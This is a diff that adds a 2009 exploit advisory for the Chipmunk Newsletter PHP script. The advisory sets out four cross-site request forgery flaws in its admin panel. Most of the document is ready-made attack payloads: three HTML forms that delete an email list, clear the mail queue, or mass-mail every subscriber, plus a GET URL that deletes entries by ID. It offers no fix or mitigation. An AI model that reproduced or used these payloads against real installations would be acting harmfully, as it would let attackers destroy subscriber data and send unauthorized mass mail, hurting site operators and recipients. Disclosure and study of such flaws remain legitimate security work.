@@ -1,0 +1,67 @@
+[-------------------------------------------------------------------------------------------------]
+[   Title: Chipmunk Newsletter CSRF Vulnerabilities                                               ]
+[   Author: Milos Zivanovic                                                                       ]
+[   Date: 11. December 2009.                                                                      ]
+[-------------------------------------------------------------------------------------------------]
+
+[-------------------------------------------------------------------------------------------------]
+[   Application: Chipmunk Newsletter                                                              ]
+[   Version: the only one there is                                                                ]
+[   Download: http://www.chipmunk-scripts.com/newsletter/newsletter.zip                           ]
+[   Vulnerability: Cross Site Request Forgery                                                     ]
+[-------------------------------------------------------------------------------------------------]
+
+I've noticed one XSS exploit was found by someone else so i decided to check it a little bit more
+and i found some sweet CSRF exploits in admin panel.
+
+[#]Content
+ |--CSRF Delete Email List (also will remove all mails subscribed to this list)
+ |--CSRF Clear Queue (Set all send to zero?)
+ |--CSRF Send letter (this will mass mail all mails in database)
+ |--CSRF Delete Email by ID
+
+[-]CSRF Delete Email List (also will remove all mails subscribed to this list)
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/newsletter/admin/dellist.php" method="POST">
+  <select name='lists'>
+    <option value='3'>newsletter_list</option>
+  </select>
+  <input type='submit' name='submit' value='Delete'>
+</form>
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[-]CSRF Clear Queue (Set all send to zero?)
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/newsletter/admin/clearqueue.php" method="POST">
+  <input type="submit" name="submit">
+</form>
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[-]CSRF Send letter (this will mass mail all mails in database)
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/newsletter/admin/sendletter.php" method="POST">
+  <input type='text' name='subject' value="Mail Subject">
+  <select name='lists'>
+    <option value='0' selected>All</option>
+  </select>
+  <textarea name='nletter' rows='8' cols='60' id='7'>Mail message here</textarea>
+  
+  <input type='submit' name='submit' value='submit'>
+</form>
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[-]CSRF Delete Email by ID
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/newsletter/admin/deleteadd.php?ID=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[-------------------------------------------------------------------------------------------------]
+[                                              EOF                                                ]
+[-------------------------------------------------------------------------------------------------]
